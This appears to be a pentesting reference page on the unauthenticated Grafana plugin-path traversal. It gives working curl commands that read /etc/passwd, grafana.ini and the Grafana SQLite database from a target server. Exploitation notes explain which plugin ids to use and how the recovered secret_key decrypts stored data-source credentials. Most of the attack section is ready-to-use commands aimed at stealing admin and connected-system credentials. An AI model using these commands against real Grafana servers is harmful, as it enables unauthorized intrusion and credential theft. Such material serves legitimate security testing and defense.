---
title: "Path traversal file read: the unauthenticated Grafana plugin traversal"
order: 2
description: "A Grafana flaw in the plugin asset endpoint allowed directory traversal in the plugin path, so an unauthenticated request reads arbitrary files from the Grafana server. Reading grafana.ini and the database recovers the admin password hash, the secret key that decrypts stored data-source credentials, and other secrets, from no authentication on a vulnerable version."
keywords:
  - grafana path traversal
  - public plugins
  - arbitrary file read
  - grafana.ini
  - secret key
---

# Path traversal file read

Grafana's plugin asset-serving endpoint (`/public/plugins/<plugin-id>/`) failed to sanitize the requested path, so traversal sequences in the path escaped the plugin directory and read arbitrary files from the Grafana server, with no authentication. An attacker requests a known plugin id followed by `../` sequences to reach any file the Grafana process can read. The high-value targets are `grafana.ini` (the configuration, including the admin password and, critically, the `secret_key` used to encrypt stored secrets) and the Grafana database (`grafana.db` on SQLite deployments), which together let the attacker recover the admin credentials and decrypt the stored data-source credentials. So on a vulnerable version this unauthenticated read leads to full takeover and the keys to everything Grafana connects to.

```bash
# traverse out of a known plugin to read server files (unauthenticated)
curl -sk --path-as-is 'https://<target>:3000/public/plugins/alertlist/../../../../../../../../etc/passwd'
# the prizes:
curl -sk --path-as-is 'https://<target>:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini'  # admin pw + secret_key
curl -sk --path-as-is 'https://<target>:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db' -o grafana.db  # SQLite DB
```

## Exploitation notes

- Use a plugin id that exists on the target (core plugins like `alertlist`, `graph`, `text` are present by default); the endpoint requires a real plugin prefix before the traversal.
- `grafana.ini` yields the admin password and the `secret_key`; the database yields the encrypted `data_source` secrets, and with the `secret_key` those decrypt to the plaintext data-source credentials, see [Data source SSRF and credentials](data-source-ssrf-and-credentials.md).
- This is unauthenticated on vulnerable versions, so it is the strongest Grafana primitive where applicable; confirm the version ([enumeration](enumeration.md)) is in range.
- Use `--path-as-is` so the traversal survives to the server; the read runs as the Grafana process user.

## References

- [Grafana security advisory (plugin path traversal)](https://grafana.com/security/security-advisories/)
- [HackTricks: Grafana](https://book.hacktricks.xyz/network-services-pentesting/3000-pentesting-grafana)
